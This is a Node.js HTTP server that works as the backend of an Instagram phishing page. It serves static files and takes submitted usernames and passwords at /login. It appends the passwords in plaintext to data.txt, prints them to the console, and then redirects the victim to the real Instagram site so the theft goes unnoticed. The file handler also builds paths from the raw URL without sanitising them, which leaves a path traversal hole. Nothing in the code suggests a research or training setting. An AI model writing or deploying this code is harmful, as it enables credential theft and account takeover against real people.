const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
const querystring = require('querystring');

const PORT = 8080;

const server = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url);
    
    // Handle login POST request
    if (req.method === 'POST' && parsedUrl.pathname === '/login') {
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });
        
        req.on('end', () => {
            const formData = querystring.parse(body);
            const username = formData.username || '';
            const password = formData.password || '';
            
            // Save to data.txt file
            const logEntry = `Username: ${username}, Password: ${password}, Time: ${new Date().toISOString()}\n`;
            
            fs.appendFile('data.txt', logEntry, (err) => {
                if (err) {
                    console.error('Error writing to file:', err);
                    res.writeHead(500, { 'Content-Type': 'text/html' });
                    res.end('<html><body><h1>500 Internal Server Error</h1></body></html>');
                    return;
                }
                
                console.log('Credentials saved:', { username, password });
                
                // Redirect to Instagram after saving
                res.writeHead(302, {
                    'Location': 'https://www.instagram.com/'
                });
                res.end();
            });
        });
        
        return;
    }
    
    // Serve static files
    if (req.method === 'GET') {
        let filePath = '.' + parsedUrl.pathname;
        if (filePath === './') {
            filePath = './index.html';
        }
        
        const extname = path.extname(filePath);
        let contentType = 'text/html';
        
        switch (extname) {
            case '.css':
                contentType = 'text/css';
                break;
            case '.js':
                contentType = 'text/javascript';
                break;
            case '.jpg':
            case '.jpeg':
                contentType = 'image/jpeg';
                break;
            case '.png':
                contentType = 'image/png';
                break;
        }
        
        fs.readFile(filePath, (err, content) => {
            if (err) {
                if (err.code === 'ENOENT') {
                    res.writeHead(404, { 'Content-Type': 'text/html' });
                    res.end('<html><body><h1>404 Not Found</h1></body></html>');
                } else {
                    res.writeHead(500, { 'Content-Type': 'text/html' });
                    res.end('<html><body><h1>500 Internal Server Error</h1></body></html>');
                }
            } else {
                res.writeHead(200, { 'Content-Type': contentType });
                res.end(content, 'utf-8');
            }
        });
    }
});

server.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}/`);
    console.log('Credentials will be saved to data.txt file');
});